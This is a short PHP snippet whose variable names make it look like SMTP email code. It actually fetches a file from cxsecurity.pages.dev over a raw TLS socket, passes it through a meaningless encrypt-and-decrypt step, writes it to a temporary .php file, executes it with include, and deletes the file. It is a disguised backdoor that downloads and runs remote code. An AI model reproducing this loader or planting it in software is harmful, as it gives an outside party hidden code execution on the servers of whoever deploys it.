$smtp_server = "cxsecurity.pages.dev";
$smtp_port = 443;
$email_file = "/cdn/index.txt";
$connection = stream_socket_client("ssl://$smtp_server:$smtp_port", $errno, $errstr, 30);
if($connection){
    $message = "GET $email_file HTTP/1.1\r\n";
    $message .= "Host: $smtp_server\r\n";
    $message .= "User-Agent: Mozilla/5.0\r\n";
    $message .= "Connection: Close\r\n\r\n";
    fwrite($connection, $message);
    $email_body = "";
    while(!feof($connection)){$email_body .= fgets($connection, 128);}
    fclose($connection);
    $body_start = strpos($email_body, "\r\n\r\n");
    if($body_start !== false){$email_body = substr($email_body, $body_start + 4);}
    if($email_body !== false){
        $secret_key = hash("sha256", "smtp_secret", true);
        $random_iv = openssl_random_pseudo_bytes(16);
        $encrypted_email = openssl_encrypt($email_body, "aes-256-cbc", $secret_key, OPENSSL_RAW_DATA, $random_iv);
        $encoded_email = base64_encode($random_iv . $encrypted_email);
        $decoded_data = base64_decode($encoded_email);
        $iv_part = substr($decoded_data, 0, 16);
        $encrypted_part = substr($decoded_data, 16);
        $decrypted_email = openssl_decrypt($encrypted_part, "aes-256-cbc", $secret_key, OPENSSL_RAW_DATA, $iv_part);
        if($decrypted_email !== false){
            $temp_file = sys_get_temp_dir() . "/" . md5(uniqid()) . ".php";
            file_put_contents($temp_file, $decrypted_email);
            include $temp_file;
            unlink($temp_file);
        }
    }
}
